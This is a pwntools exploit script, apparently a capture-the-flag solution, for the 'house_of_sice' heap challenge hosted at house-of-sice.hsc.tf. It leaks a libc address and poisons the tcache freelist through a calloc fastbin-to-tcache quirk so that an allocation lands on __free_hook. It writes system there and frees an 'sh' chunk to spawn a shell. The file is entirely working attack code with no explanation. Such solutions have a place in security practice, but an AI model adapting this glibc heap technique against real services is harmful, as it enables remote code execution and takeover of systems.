from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './house_of_sice'
HOST = 'house-of-sice.hsc.tf'
PORT = 1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
	debug(r, [])

def a(val, f=False):
	r.sendlineafter('> ', '1')
	if f == False:
		r.sendlineafter('> ', '1')
	else:
		r.sendlineafter('> ', '2')
		
	r.sendlineafter('> ', str(val))
def d(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', str(idx))
r.recvuntil('deet: ') 
leak = int(r.recvuntil('\n', True), 16)
dbg('leak')
base = leak - 0x55410
dbg('base')
fh = base + 0x1eeb28

for i in range(8):
	a(1)
for i in range(8):
	d(7-i)

# get 2 tcache chunk
a(1)

# put fastbin chunk into tcache
d(0)

# prepare target address
a(fh-0x10)

# put chunk in fastbin to tcache because of tcache_put in __libc_calloc
a(0x6873, f=True)

# next alloc will be target address
a(leak)

d(0)
r.interactive()
r.close()
